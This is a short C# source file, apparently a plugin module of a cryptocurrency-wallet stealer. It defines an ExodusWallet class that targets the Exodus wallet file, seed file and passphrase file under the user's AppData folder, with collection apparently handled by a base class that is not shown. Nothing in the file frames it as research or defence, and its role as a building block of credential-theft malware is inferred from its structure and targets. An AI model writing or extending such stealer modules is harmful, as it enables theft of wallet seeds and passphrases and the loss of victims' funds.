using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Crypto
{
    public class ExodusWallet : CryptoWalletBase
    {
        public ExodusWallet()
        {
            walletName = "Exodus";
            
            // Exodus wallet paths
            walletPaths.Add("%APPDATA%\\Exodus\\exodus.wallet");
            walletPaths.Add("%APPDATA%\\Exodus\\seed.seco");
            walletPaths.Add("%APPDATA%\\Exodus\\passphrase.json");
        }
    }
}
